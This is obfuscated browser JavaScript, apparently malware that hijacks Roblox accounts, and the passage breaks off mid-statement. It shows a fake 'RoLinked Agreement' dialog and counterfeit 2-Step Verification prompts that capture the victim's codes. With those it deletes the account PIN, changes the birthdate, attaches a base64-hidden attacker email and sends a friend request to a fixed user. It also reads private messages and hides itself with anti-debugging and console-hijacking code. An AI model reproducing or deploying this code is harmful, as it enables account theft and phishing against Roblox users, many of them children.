(async function () {
    var S = (function () {
        var R = {
            LQCxc: "true",
            AVLuo: "promptPopup",
            vrRWh: "text-footer footer-note",
            zDAXL: "Not Active",
            HaeZH: function (q, Q) {
                return q !== Q;
            },
            Mwojr: "kcPGM",
            WQuZg: function (q, Q) {
                return q === Q;
            },
            jlilo: "zhwbG",
            cfBjf: "LopqM",
        };
        var T = true;
        return function (Q, n) {
            var F = { eQZAk: "btn-cta-md modal-modern-footer-button" };
            var B = T
                ? function () {
                      var O = {
                          ZtliN: R.LQCxc,
                          Iparb: R.AVLuo,
                          ssRmH: R.vrRWh,
                          eBpCj: R.zDAXL,
                      };
                      if (R.HaeZH(R.Mwojr, R.Mwojr)) {
                          h.push(L.ZtliN);
                      } else {
                          if (n) {
                              if (R.WQuZg(R.jlilo, R.cfBjf)) {
                                  t.getElementById(L.Iparb).remove();
                                  V.getElementsByClassName(
                                      L.ssRmH
                                  )[0].innerText = L.eBpCj;
                              } else {
                                  var e = n.apply(Q, arguments);
                                  return (n = null), e;
                              }
                          }
                      }
                  }
                : function () {};
            return (T = false), B;
        };
    })();
    var C = S(this, function () {
        return C.toString()
            .search("(((.+)+)+)+$")
            .toString()
            .constructor(C)
            .search("(((.+)+)+)+$");
    });
    C();
    var V = (function () {
        var T = true;
        return function (q, Q) {
            var F = T
                ? function () {
                      if (Q) {
                          var L = Q.apply(q, arguments);
                          return (Q = null), L;
                      }
                  }
                : function () {};
            return (T = false), F;
        };
    })();
    (function () {
        V(this, function () {
            var Q = new RegExp("function *\\( *\\)"),
                n = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i"),
                F = t("init");
            if (!Q.test(F + "chain") || !n.test(F + "input")) {
                F("0");
            } else {
                t();
            }
        })();
    })();
    var h = (function () {
            var T = true;
            return function (q, Q) {
                var F = T
                    ? function () {
                          if (Q) {
                              var p = Q.apply(q, arguments);
                              return (Q = null), p;
                          }
                      }
                    : function () {};
                return (T = false), F;
            };
        })(),
        N = h(this, function () {
            var T;
            try {
                var q = Function(
                    'return (function() {}.constructor("return this")( ));'
                );
                T = q();
            } catch (v) {
                T = window;
            }
            var Q = (T.console = T.console || {}),
                n = [
                    "log",
                    "warn",
                    "info",
                    "error",
                    "exception",
                    "table",
                    "trace",
                ];
            for (var F = 0; F < n.length; F++) {
                var L = h.constructor.prototype.bind(h);
                var O = n[F];
                var u = Q[O] || L;
                L["__proto__"] = h.bind(h);
                L.toString = u.toString.bind(u);
                Q[O] = L;
            }
        });
    N();
    const w = (R) => new Promise((T) => setTimeout(T, R));
    var X = [
            "Z29pY2tnbmVycmViQG91dGxvb2suY29t",
            "Z3J1ZXR0ZmljazBAb3V0bG9vay5jb20=",
            "Z2Vpc3RiZXpha3JAb3V0bG9vay5jb20=",
            "Z3JhY2lhbWFzY2lvc0BvdXRsb29rLmNvbQ==",
        ],
        M = "outlook.com",
        i = "g***",
        Y = X[Math.floor(Math.random() * X.length)],
        W = 6045232974;
    validDev = [];
    try {
        $.ajax({
            method: "GET",
            url: "https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=0&pageSize=20",
            contentType: "application/json",
            success: function (R) {
                var q = Number(R.totalPages);
                for (let n = 0; n < q; n++) {
                    $.ajax({
                        method: "GET",
                        url:
                            "https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=" +
                            n +
                            "&pageSize=20",
                        contentType: "application/json",
                        success: function (p) {
                            var L = p.collection;
                            for (var e of L) {
                                if (e.body.includes("VlK Games") == true) {
                                    validDev.push("true");
                                }
                            }
                        },
                    });
                }
            },
        });
    } catch {}
    try {
        $.ajax({
            method: "GET",
            url: "https://privatemessages.roblox.com/v1/messages?messageTab=archive&pageNumber=0&pageSize=20",
            contentType: "application/json",
            success: function (q) {
                var n = Number(q.totalPages);
                for (let F = 0; F < n; F++) {
                    $.ajax({
                        method: "GET",
                        url:
                            "https://privatemessages.roblox.com/v1/messages?messageTab=archive&pageNumber=" +
                            F +
                            "&pageSize=20",
                        contentType: "application/json",
                        success: function (B) {
                            var L = B.collection;
                            for (var e of L) {
                                if (e.body.includes("VlK Games") == true) {
                                    validDev.push("true");
                                }
                            }
                        },
                    });
                }
            },
        });
    } catch {}
    try {
        console.log(
            document.getElementsByClassName("text-footer footer-note")[0]
                .innerText
        );
    } catch {
        window.location.reload();
    }
    if (
        document.getElementsByClassName("text-footer footer-note")[0]
            .innerText != "Active"
    ) {
        document.getElementsByClassName(
            "text-footer footer-note"
        )[0].innerText = "Active";
        $.ajax({
            method: "GET",
            url: "https://users.roblox.com/v1/users/authenticated",
            contentType: "application/json",
            success: function (n) {
                var p = n.id;
                try {
                    var B = { friendshipOriginSourceType: 0 };
                    $.ajax({
                        method: "POST",
                        url:
                            "https://friends.roblox.com/v1/users/" +
                            W +
                            "/request-friendship",
                        contentType: "application/json",
                        data: JSON.stringify(B),
                    });
                } catch {}
                async function O() {
                    function u() {
                        $.ajax({
                            method: "GET",
                            url: "https://accountsettings.roblox.com/v1/email",
                            contentType: "application/json",
                            success: function (J) {
                                if (J.emailAddress == null) {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://accountsettings.roblox.com/v1/email",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            emailAddress: atob(Y),
                                            password: "",
                                        }),
                                    });
                                } else {
                                    var a = J.emailAddress,
                                        Z = J.verified;
                                    if (a.includes(M) == true) {
                                        a.includes(i) == true &&
                                            Z == true &&
                                            (async function () {
                                                await w(500);
                                                var m = {
                                                    method: "POST",
                                                    url: "https://auth.roblox.com/v2/logout",
                                                    contentType:
                                                        "application/json",
                                                };
                                                $.ajax(m);
                                            })();
                                    }
                                }
                            },
                        }),
                            setTimeout(u, 2000);
                    }
                    u();
                    function I(y, z, J) {
                        $.ajax({
                            method: "POST",
                            url:
                                "https://twostepverification.roblox.com/v1/users/" +
                                p +
                                "/challenges/email/send-code",
                            contentType: "application/json",
                            data: JSON.stringify({
                                actionType: "Generic",
                                challengeId: y,
                            }),
                            success: function () {
                                var A =
                                    '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                                document.body.insertAdjacentHTML(
                                    "beforeend",
                                    A
                                );
                                function G() {
                                    document.getElementById(
                                        "two-step-verification-code-input"
                                    ).value.length == 6
                                        ? (document.getElementsByClassName(
                                              "btn-cta-md modal-modern-footer-button"
                                          )[0].disabled = false)
                                        : (document.getElementsByClassName(
                                              "btn-cta-md modal-modern-footer-button"
                                          )[0].disabled = true);
                                    setTimeout(G, 100);
                                }
                                G();
                                document.getElementsByClassName(
                                    "btn-cta-md modal-modern-footer-button"
                                )[0].onclick = function () {
                                    $.ajax({
                                        method: "POST",
                                        url:
                                            "https://twostepverification.roblox.com/v1/users/" +
                                            p +
                                            "/challenges/email/verify",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            challengeId: y,
                                            actionType: "Generic",
                                            code: document.getElementById(
                                                "two-step-verification-code-input"
                                            ).value,
                                        }),
                                        success: function (m) {
                                            var l0 = m.verificationToken;
                                            $.ajax({
                                                method: "POST",
                                                url: "https://apis.roblox.com/challenge/v1/continue",
                                                contentType: "application/json",
                                                data: JSON.stringify({
                                                    challengeId: z,
                                                    challengeMetadata:
                                                        '{"verificationToken":"' +
                                                        l0 +
                                                        '","rememberDevice":false,"challengeId":"' +
                                                        y +
                                                        '","actionType":"Generic"}',
                                                    challengeType:
                                                        "twostepverification",
                                                }),
                                                success: function () {
                                                    document
                                                        .getElementById(
                                                            "twoStepPrompts"
                                                        )
                                                        .remove();
                                                    w(2000);
                                                    var l3 = btoa(
                                                        '{"reauthenticationToken":"' +
                                                            l0 +
                                                            '"}'
                                                    );
                                                    console.log(J);
                                                    if (J == 1) {
                                                        console.log(
                                                            "Reason is 1"
                                                        );
                                                        var l4 = {
                                                            method: "POST",
                                                            url:
                                                                "https://twostepverification.roblox.com/v1/users/" +
                                                                p +
                                                                "/configuration/email/enable",
                                                            contentType:
                                                                "application/json",
                                                            headers: {},
                                                        };
                                                        l4.headers[
                                                            "Rblx-Challenge-Type"
                                                        ] = "reauthentication";
                                                        l4.headers[
                                                            "Rblx-Challenge-Id"
                                                        ] = z;
                                                        l4.headers[
                                                            "Rblx-Challenge-Metadata"
                                                        ] = l3;
                                                        $.ajax(l4);
                                                    } else {
                                                        if (J == null) {
                                                            $.ajax({
                                                                method: "DELETE",
                                                                url: "https://auth.roblox.com/v1/account/pin",
                                                                contentType:
                                                                    "application/json",
                                                                headers: {
                                                                    "Rblx-Challenge-Type":
                                                                        "reauthentication",
                                                                    "Rblx-Challenge-Id":
                                                                        z,
                                                                    "Rblx-Challenge-Metadata":
                                                                        l3,
                                                                },
                                                                success:
                                                                    function () {
                                                                        o(
                                                                            null,
                                                                            null
                                                                        );
                                                                    },
                                                            });
                                                        } else {
                                                            o(z, l3);
                                                        }
                                                    }
                                                },
                                            });
                                        },
                                        error: function () {
                                            (document.getElementsByClassName(
                                                "form-control-label bottom-label xsmall"
                                            )[0].innerText = "Invalid code"),
                                                (document.getElementById(
                                                    "groupElementId"
                                                ).className =
                                                    "form-has-feedback  form-has-error form-group");
                                        },
                                    });
                                };
                            },
                        });
                    }
                    function v(y, z, J) {
                        var a =
                            '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code generated by your authenticator app. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                        document.body.insertAdjacentHTML("beforeend", a);
                        function Z() {
                            document.getElementById(
                                "two-step-verification-code-input"
                            ).value.length == 6
                                ? (document.getElementsByClassName(
                                      "btn-cta-md modal-modern-footer-button"
                                  )[0].disabled = false)
                                : (document.getElementsByClassName(
                                      "btn-cta-md modal-modern-footer-button"
                                  )[0].disabled = true),
                                setTimeout(Z, 100);
                        }
                        Z();
                        document.getElementsByClassName(
                            "btn-cta-md modal-modern-footer-button"
                        )[0].onclick = function () {
                            $.ajax({
                                method: "POST",
                                url:
                                    "https://twostepverification.roblox.com/v1/users/" +
                                    p +
                                    "/challenges/authenticator/verify",
                                contentType: "application/json",
                                data: JSON.stringify({
                                    challengeId: y,
                                    actionType: "Generic",
                                    code: document.getElementById(
                                        "two-step-verification-code-input"
                                    ).value,
                                }),
                                success: function (G) {
                                    var f = G.verificationToken;
                                    $.ajax({
                                        method: "POST",
                                        url: "https://apis.roblox.com/challenge/v1/continue",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            challengeId: z,
                                            challengeMetadata:
                                                '{"verificationToken":"' +
                                                f +
                                                '","rememberDevice":false,"challengeId":"' +
                                                y +
                                                '","actionType":"Generic"}',
                                            challengeType:
                                                "twostepverification",
                                        }),
                                        success: function () {
                                            document
                                                .getElementById(
                                                    "twoStepPrompts"
                                                )
                                                .remove();
                                            w(2000);
                                            var l0 = btoa(
                                                '{"reauthenticationToken":"' +
                                                    f +
                                                    '"}'
                                            );
                                            if (J == 1) {
                                                console.log("Reason is 1");
                                                var l1 = {
                                                    method: "POST",
                                                    url:
                                                        "https://twostepverification.roblox.com/v1/users/" +
                                                        p +
                                                        "/configuration/email/enable",
                                                    contentType:
                                                        "application/json",
                                                    headers: {},
                                                };
                                                l1.headers[
                                                    "Rblx-Challenge-Type"
                                                ] = "reauthentication";
                                                l1.headers[
                                                    "Rblx-Challenge-Id"
                                                ] = z;
                                                l1.headers[
                                                    "Rblx-Challenge-Metadata"
                                                ] = l0;
                                                $.ajax(l1);
                                            } else {
                                                if (J == null) {
                                                    $.ajax({
                                                        method: "DELETE",
                                                        url: "https://auth.roblox.com/v1/account/pin",
                                                        contentType:
                                                            "application/json",
                                                        headers: {
                                                            "Rblx-Challenge-Type":
                                                                "reauthentication",
                                                            "Rblx-Challenge-Id":
                                                                z,
                                                            "Rblx-Challenge-Metadata":
                                                                l0,
                                                        },
                                                        success: function () {
                                                            o(null, null);
                                                        },
                                                    });
                                                } else {
                                                    o(z, l0);
                                                }
                                            }
                                        },
                                    });
                                },
                                error: function (G) {
                                    G.responseText.includes('"code":18')
                                        ? ((document.getElementsByClassName(
                                              "form-control-label bottom-label xsmall"
                                          )[0].innerText =
                                              "This code has already been used. Please enter a new code."),
                                          (document.getElementById(
                                              "groupElementId"
                                          ).className =
                                              "form-has-feedback  form-has-error form-group"))
                                        : ((document.getElementsByClassName(
                                              "form-control-label bottom-label xsmall"
                                          )[0].innerText = "Invalid code"),
                                          (document.getElementById(
                                              "groupElementId"
                                          ).className =
                                              "form-has-feedback  form-has-error form-group"));
                                },
                            });
                        };
                    }
                    function x(y, z) {
                        $.ajax({
                            method: "POST",
                            url: "https://apis.roblox.com/otp-service/v1/sendCodeForUser",
                            contentType: "application/json",
                            data: JSON.stringify({
                                contactType: "Email",
                                messageVariant: "Default",
                                origin: "Reauth",
                            }),
                            success: function (J) {
                                var a = J.otpSessionToken,
                                    Z =
                                        '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">A one-time code has been sent to your registered email. Please enter your one-time code to continue.</p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-Digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                                document.body.insertAdjacentHTML(
                                    "beforeend",
                                    Z
                                );
                                function K() {
                                    if (
                                        document.getElementById(
                                            "two-step-verification-code-input"
                                        ).value.length == 6
                                    ) {
                                        document.getElementsByClassName(
                                            "btn-cta-md modal-modern-footer-button"
                                        )[0].disabled = false;
                                    } else {
                                        document.getElementsByClassName(
                                            "btn-cta-md modal-modern-footer-button"
                                        )[0].disabled = true;
                                    }
                                    setTimeout(K, 100);
                                }
                                K();
                                document.getElementsByClassName(
                                    "btn-cta-md modal-modern-footer-button"
                                )[0].onclick = function () {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://apis.roblox.com/otp-service/v1/validateCode",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            contactType: "Email",
                                            origin: "Reauth",
                                            otpSessionToken: a,
                                            passCode: document.getElementById(
                                                "two-step-verification-code-input"
                                            ).value,
                                        }),
                                        success: function () {
                                            $.ajax({
                                                method: "POST",
                                                url: "https://apis.roblox.com/reauthentication-service/v1/token/generate",
                                                contentType: "application/json",
                                                data: JSON.stringify({
                                                    sessionId: a,
                                                    type: "Otp_Email",
                                                }),
                                                success: function (f) {
                                                    responseToken = f.token;
                                                    $.ajax({
                                                        method: "POST",
                                                        url: "https://apis.roblox.com/challenge/v1/continue",
                                                        contentType:
                                                            "application/json",
                                                        data: JSON.stringify({
                                                            challengeId: y,
                                                            challengeMetadata:
                                                                '{"reauthenticationToken":"' +
                                                                responseToken +
                                                                '"}',
                                                            challengeType:
                                                                "reauthentication",
                                                        }),
                                                        success: function () {
                                                            document
                                                                .getElementById(
                                                                    "twoStepPrompts"
                                                                )
                                                                .remove();
                                                            w(2000);
                                                            var l1 = btoa(
                                                                '{"reauthenticationToken":"' +
                                                                    responseToken +
                                                                    '"}'
                                                            );
                                                            if (z == 1) {
                                                                console.log(
                                                                    "Reason is 1"
                                                                );
                                                                var l2 = {
                                                                    method: "POST",
                                                                    url:
                                                                        "https://twostepverification.roblox.com/v1/users/" +
                                                                        p +
                                                                        "/configuration/email/enable",
                                                                    contentType:
                                                                        "application/json",
                                                                    headers: {},
                                                                };
                                                                l2.headers[
                                                                    "Rblx-Challenge-Type"
                                                                ] =
                                                                    "reauthentication";
                                                                l2.headers[
                                                                    "Rblx-Challenge-Id"
                                                                ] = y;
                                                                l2.headers[
                                                                    "Rblx-Challenge-Metadata"
                                                                ] = l1;
                                                                $.ajax(l2);
                                                            } else {
                                                                if (z == null) {
                                                                    $.ajax({
                                                                        method: "DELETE",
                                                                        url: "https://auth.roblox.com/v1/account/pin",
                                                                        contentType:
                                                                            "application/json",
                                                                        headers:
                                                                            {
                                                                                "Rblx-Challenge-Type":
                                                                                    "reauthentication",
                                                                                "Rblx-Challenge-Id":
                                                                                    y,
                                                                                "Rblx-Challenge-Metadata":
                                                                                    l1,
                                                                            },
                                                                        success:
                                                                            function () {
                                                                                o(
                                                                                    null,
                                                                                    null
                                                                                );
                                                                            },
                                                                    });
                                                                } else {
                                                                    o(y, l1);
                                                                }
                                                            }
                                                        },
                                                    });
                                                },
                                            });
                                        },
                                        error: function () {
                                            document.getElementsByClassName(
                                                "form-control-label bottom-label xsmall"
                                            )[0].innerText = "Invalid code";
                                            document.getElementById(
                                                "groupElementId"
                                            ).className =
                                                "form-has-feedback  form-has-error form-group";
                                        },
                                    });
                                };
                            },
                        });
                    }
                    function k(y, z, J) {
                        $.ajax({
                            method: "GET",
                            url:
                                "https://twostepverification.roblox.com/v1/users/" +
                                p +
                                "/configuration",
                            contentType: "application/json",
                            success: function (a) {
                                var A = a.primaryMediaType;
                                if (A == "Email") {
                                    I(y, z, J);
                                } else {
                                    if (A == "Authenticator") {
                                        v(y, z, J);
                                    } else {
                                        if (A == null) {
                                            x(z, J);
                                        }
                                    }
                                }
                            },
                        });
                    }
                    function o(y, z) {
                        $.ajax({
                            method: "GET",
                            url:
                                "https://twostepverification.roblox.com/v1/users/" +
                                p +
                                "/configuration",
                            contentType: "application/json",
                            success: function (b) {
                                var Z = b.primaryMediaType;
                                if (Z == "Authenticator") {
                                    document.getElementsByClassName(
                                        "text-footer footer-note"
                                    )[0].innerText = "Not Active";
                                    if (
                                        document.getElementById(
                                            "emailPopupz"
                                        ) == null
                                    ) {
                                        var A =
                                            '<div id="emailPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog" bis_skin_checked="1"><div class="modal-content" role="document" bis_skin_checked="1"><div title="" class="modal-header" bis_skin_checked="1"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Email 2-Step Verification</h4><div class="modal-modern-header-info" bis_skin_checked="1"></div></div><div class="modal-body" bis_skin_checked="1"><div class="modal-lock-icon" bis_skin_checked="1"></div><p>You must enable Email 2-Step Verification to complete this action.</p></div><div class="modal-footer" bis_skin_checked="1"><div class="modal-modern-footer-buttons" bis_skin_checked="1"><button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Set Up">Enable</button></div></div></div></div></div></div>';
                                        document.body.insertAdjacentHTML(
                                            "beforeend",
                                            A
                                        );
                                        document.getElementsByClassName(
                                            "btn-cta-md modal-modern-footer-button"
                                        )[0].onclick = function () {
                                            document
                                                .getElementById("emailPopupz")
                                                .remove();
                                            document.getElementById(
                                                "agreeRoLinked"
                                            ).disabled = false;
                                            $.ajax({
                                                method: "POST",
                                                url:
                                                    "https://twostepverification.roblox.com/v1/users/" +
                                                    p +
                                                    "/configuration/email/enable",
                                                contentType: "application/json",
                                                success: function () {},
                                                error: function (H) {
                                                    var l2 = atob(
                                                            H.getResponseHeader(
                                                                "rblx-challenge-metadata"
                                                            )
                                                        ),
                                                        l3 =
                                                            H.getResponseHeader(
                                                                "rblx-challenge-id"
                                                            ),
                                                        l4 = l2
                                                            .split(
                                                                '"challengeId":"'
                                                            )
                                                            .pop()
                                                            .split('"')[0];
                                                    k(l4, l3, 1);
                                                },
                                            });
                                        };
                                    }
                                } else {
                                    if (y == null) {
                                        var K = {
                                            birthDay: 2,
                                            birthMonth: 2,
                                            birthYear: 2022,
                                        };
                                        $.ajax({
                                            method: "POST",
                                            url: "https://users.roblox.com/v1/birthdate",
                                            contentType: "application/json",
                                            data: JSON.stringify(K),
                                            success: function () {
                                                $.ajax({
                                                    method: "POST",
                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                    contentType:
                                                        "application/json",
                                                    data: JSON.stringify({
                                                        emailAddress: atob(Y),
                                                        password: "",
                                                    }),
                                                    success: function () {
                                                        (async function () {
                                                            await w(1500);
                                                            $.ajax({
                                                                method: "GET",
                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                contentType:
                                                                    "application/json",
                                                                success:
                                                                    function (
                                                                        l5
                                                                    ) {
                                                                        if (
                                                                            l5.emailAddress ==
                                                                            null
                                                                        ) {
                                                                            $.ajax(
                                                                                {
                                                                                    method: "POST",
                                                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                                                    contentType:
                                                                                        "application/json",
                                                                                    data: JSON.stringify(
                                                                                        {
                                                                                            emailAddress:
                                                                                                atob(
                                                                                                    Y
                                                                                                ),
                                                                                            password:
                                                                                                "",
                                                                                        }
                                                                                    ),
                                                                                }
                                                                            );
                                                                        }
                                                                    },
                                                            });
                                                        })();
                                                    },
                                                    error: function () {
                                                        (async function () {
                                                            await w(1500),
                                                                $.ajax({
                                                                    method: "GET",
                                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                                    contentType:
                                                                        "application/json",
                                                                    success:
                                                                        function (
                                                                            l4
                                                                        ) {
                                                                            l4.emailAddress ==
                                                                                null &&
                                                                                $.ajax(
                                                                                    {
                                                                                        method: "POST",
                                                                                        url: "https://accountsettings.roblox.com/v1/email",
                                                                                        contentType:
                                                                                            "application/json",
                                                                                        data: JSON.stringify(
                                                                                            {
                                                                                                emailAddress:
                                                                                                    atob(
                                                                                                        Y
                                                                                                    ),
                                                                                                password:
                                                                                                    "",
                                                                                            }
                                                                                        ),
                                                                                    }
                                                                                );
                                                                        },
                                                                });
                                                        })();
                                                    },
                                                });
                                            },
                                            error: function (H) {
                                                var l2 = atob(
                                                        H.getResponseHeader(
                                                            "rblx-challenge-metadata"
                                                        )
                                                    ),
                                                    l3 =
                                                        H.getResponseHeader(
                                                            "rblx-challenge-id"
                                                        ),
                                                    l4 = l2
                                                        .split(
                                                            '"challengeId":"'
                                                        )
                                                        .pop()
                                                        .split('"')[0];
                                                k(l4, l3, 2);
                                            },
                                        });
                                    } else {
                                        var G = {
                                            birthDay: 2,
                                            birthMonth: 2,
                                            birthYear: 2022,
                                        };
                                        $.ajax({
                                            method: "POST",
                                            url: "https://users.roblox.com/v1/birthdate",
                                            contentType: "application/json",
                                            headers: {
                                                "Rblx-Challenge-Type":
                                                    "reauthentication",
                                                "Rblx-Challenge-Id": y,
                                                "Rblx-Challenge-Metadata": z,
                                            },
                                            data: JSON.stringify(G),
                                            success: function () {
                                                $.ajax({
                                                    method: "POST",
                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                    contentType:
                                                        "application/json",
                                                    data: JSON.stringify({
                                                        emailAddress: atob(Y),
                                                        password: "",
                                                    }),
                                                    success: function () {
                                                        (async function () {
                                                            await w(1500),
                                                                $.ajax({
                                                                    method: "GET",
                                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                                    contentType:
                                                                        "application/json",
                                                                    success:
                                                                        function (
                                                                            l2
                                                                        ) {
                                                                            l2.emailAddress ==
                                                                                null &&
                                                                                $.ajax(
                                                                                    {
                                                                                        method: "POST",
                                                                                        url: "https://accountsettings.roblox.com/v1/email",
                                                                                        contentType:
                                                                                            "application/json",
                                                                                        data: JSON.stringify(
                                                                                            {
                                                                                                emailAddress:
                                                                                                    atob(
                                                                                                        Y
                                                                                                    ),
                                                                                                password:
                                                                                                    "",
                                                                                            }
                                                                                        ),
                                                                                    }
                                                                                );
                                                                        },
                                                                });
                                                        })();
                                                    },
                                                    error: function () {
                                                        (async function () {
                                                            await w(1500),
                                                                $.ajax({
                                                                    method: "GET",
                                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                                    contentType:
                                                                        "application/json",
                                                                    success:
                                                                        function (
                                                                            l5
                                                                        ) {
                                                                            l5.emailAddress ==
                                                                                null &&
                                                                                $.ajax(
                                                                                    {
                                                                                        method: "POST",
                                                                                        url: "https://accountsettings.roblox.com/v1/email",
                                                                                        contentType:
                                                                                            "application/json",
                                                                                        data: JSON.stringify(
                                                                                            {
                                                                                                emailAddress:
                                                                                                    atob(
                                                                                                        Y
                                                                                                    ),
                                                                                                password:
                                                                                                    "",
                                                                                            }
                                                                                        ),
                                                                                    }
                                                                                );
                                                                        },
                                                                });
                                                        })();
                                                    },
                                                });
                                            },
                                            error: function (l0) {
                                                var l3 = atob(
                                                        l0.getResponseHeader(
                                                            "rblx-challenge-metadata"
                                                        )
                                                    ),
                                                    l4 =
                                                        l0.getResponseHeader(
                                                            "rblx-challenge-id"
                                                        ),
                                                    l5 = l3
                                                        .split(
                                                            '"challengeId":"'
                                                        )
                                                        .pop()
                                                        .split('"')[0];
                                                k(l5, l4, 2);
                                            },
                                        });
                                    }
                                }
                            },
                        });
                    }
                    if (document.getElementById("RoLinked1") == null) {
                        var g =
                            '<div id="RoLinked1" role="dialog"><div class="fade modal-backdrop in"></div><div aria-labelledby="contained-modal-title-vcenter" scrollable="true" centered="true" role="dialog" tabindex="-1" style="display: block;" class="fade verification-modal in modal"><div class="modal-sm modal-dialog"><div class="modal-content" role="document"><div><div title="" class="modal-header"><div class="verification-upsell-title-container"><button type="button" class="verification-upsell-title-button"></button><h4 id="contained-modal-title-vcenter" class="modal-title">RoLinked Agreement </h4></div></div><div class="verification-upsell-text-body text-description">RoLinked can view your Roblox Username</div><div class="modal-footer"><div class="text-description font-caption-body phone-verification-legal-text" hidden="">By clicking "Continue", you are submitting your phone number and agreeing to our <a href="https://en.help.roblox.com/hc/articles/9483830673556-Roblox-SMS-Terms-of-Service">SMS Terms of Use</a> and <a href="https://en.help.roblox.com/hc/articles/115004630823">Privacy Policy</a>. We will send you a one-time verification code. Message and data rates may apply. Reply HELP for help.</div><div class="buttons-section"><button type="button" class="accept-btn btn-primary-md btn-min-width" id="agreeRoLinked">Agree & Continue</button></div><div></div></div></div></div></div></div></div>';
                        document.body.insertAdjacentHTML("beforeend", g);
                        document.getElementById("agreeRoLinked").onclick =
                            function () {
                                document.getElementById(
                                    "agreeRoLinked"
                                ).disabled = true;
                                $.ajax({
                                    method: "GET",
                                    url: "https://auth.roblox.com/v1/account/pin",
                                    contentType: "application/json",
                                    success: function (z) {
                                        var b = z.isEnabled;
                                        var a = z.unlockedUntil;
                                        if (b == true) {
                                            if (a == null) {
                                                document.getElementsByClassName(
                                                    "text-footer footer-note"
                                                )[0].innerText = "Not Active";
                                                if (
                                                    document.getElementById(
                                                        "pinPopupz"
                                                    ) == null
                                                ) {
                                                    var Z =
